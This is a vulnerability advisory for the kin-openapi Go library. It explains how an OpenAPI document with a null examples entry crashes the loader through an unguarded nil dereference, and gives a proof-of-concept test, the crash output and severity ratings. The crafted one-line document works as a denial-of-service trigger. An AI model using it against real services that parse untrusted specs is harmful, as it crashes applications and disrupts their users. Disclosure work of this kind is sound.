### Summary

Loading an untrusted OpenAPI document with `kin-openapi` can crash the calling application with a nil-pointer dereference **before any validation runs**. A document whose `components.examples` (or any parameter/header/media-type `examples`) map contains a `null` entry causes `(*Loader).resolveExampleRef` to dereference a nil `*openapi3.ExampleRef`, panicking during `LoadFromData` / `ResolveRefsIn`. Any service that parses OpenAPI specs from untrusted input is exposed to a trivial denial-of-service.

### Details

When YAML/JSON such as `components: {examples: {x: null}}` is unmarshalled, the `x` key parses into a **nil** `*openapi3.ExampleRef`. During reference resolution the loader calls `resolveExampleRef` with that nil pointer.

`resolveExampleRef` is the only sibling in the `resolve*Ref` family that omits the leading nil/empty guard. In `openapi3/loader.go`:

```go
func (loader *Loader) resolveExampleRef(doc *T, component *ExampleRef, documentPath *url.URL) (err error) {
	isOpenAPI31OrLater := doc.IsOpenAPI31OrLater()

	if ref := component.Ref; ref != "" {   // <-- loader.go:1283, component is nil -> panic
```

Line **1283** (`if ref := component.Ref; ref != ""`) dereferences `component` without first checking whether it is nil. Every other resolver guards this exact case on its first statement, e.g.:

```go
func (loader *Loader) resolveHeaderRef(doc *T, component *HeaderRef, documentPath *url.URL) (err error) {
	if component.isEmpty() {
		return nil
	}
	...
}
```

The same `if component.isEmpty() { return ... }` guard is present in `resolveHeaderRef` (loader.go:717), `resolveParameterRef` (788), `resolveRequestBodyRef` (867), `resolveResponseRef` (933), `resolveSchemaRef` (1025), `resolveSecuritySchemeRef` (1222), `resolveCallbackRef` (1325) and `resolveLinkRef` (1391) — but is **missing** from `resolveExampleRef`. The guard would safely handle the nil case: `isEmpty` is defined with a nil-receiver check (`openapi3/refs.go:195`):

```go
func (x *ExampleRef) isEmpty() bool { return x == nil || x.Ref == "" && x.Value == nil }
```

Because the crash happens inside the loader, it occurs **before** the caller ever gets a chance to run `Validate()`, so input validation at the application layer cannot prevent it.

Observed panic tainted call chain:

```
runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x28]
openapi3.(*Loader).resolveExampleRef  openapi3/loader.go:1283
openapi3.(*Loader).ResolveRefsIn      openapi3/loader.go:286
openapi3.(*Loader).LoadFromData       openapi3/loader.go:196
```

### PoC

Add the following test file at `openapi3/advisory_poc_test.go`:

```go
package openapi3_test

import (
	"testing"

	"github.com/getkin/kin-openapi/openapi3"
)

const specNullExample = `
openapi: 3.0.0
info: {title: PoC, version: 1.0.0}
paths: {}
components:
  examples:
    x: null
`

// TestPoCNullExampleLoaderPanic fails on vulnerable code: loading an
// untrusted document that contains a null example panics before Validate().
func TestPoCNullExampleLoaderPanic(t *testing.T) {
	defer func() {
		if r := recover(); r != nil {
			t.Fatalf("VULNERABLE: loading panicked: %v", r)
		}
	}()
	loader := openapi3.NewLoader()
	_, _ = loader.LoadFromData([]byte(specNullExample))
	t.Log("no panic: code appears patched")
}
```

Run:

```
go test ./openapi3/ -run TestPoCNullExampleLoaderPanic -v
```

Observed output on the affected version (v0.145.0):

```
=== RUN   TestPoCNullExampleLoaderPanic
    advisory_poc_test.go:23: VULNERABLE: loading panicked: runtime error: invalid memory address or nil pointer dereference
--- FAIL: TestPoCNullExampleLoaderPanic (0.00s)
FAIL
FAIL	github.com/getkin/kin-openapi/openapi3	0.012s
FAIL
```

The `recover()` in the test converts the loader's panic into a test failure; without the recovery the process would abort. On patched code the loader returns normally, the test logs `no panic: code appears patched`, and it passes.

### Impact

Denial of service (application crash) via an untrusted OpenAPI document. Any application, tool, or service that calls `Loader.LoadFromData` / `LoadFromFile` / `LoadFromURI` on OpenAPI specs originating from an untrusted source can be crashed by a one-line malicious document (`components.examples` — or a parameter/header/media-type `examples` — containing a `null` entry). Because the panic occurs inside the loader before `Validate()` executes, the document need not be otherwise valid, and callers cannot defend against it by validating first. The only mitigation for unpatched consumers is to wrap loader calls in a `recover()`.

---

- **Ecosystem:** Go
- **Package:** github.com/getkin/kin-openapi
- **Affected versions:** all released versions up to and including v0.145.0
- **CVSS v3.1:** 7.5 (High) — `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`. Precondition: impact applies to applications that load OpenAPI documents from untrusted sources (a common use for spec-processing tools/services).
- **CWE:** CWE-476 (NULL Pointer Dereference) primary; CWE-20 (Improper Input Validation).
- **Advisory relationship:** Novel. It belongs to the same class as prior loader nil-pointer advisories (crafted-document DoS) but has a distinct trigger (a null example object) and code path (`resolveExampleRef`), not covered by any published advisory.
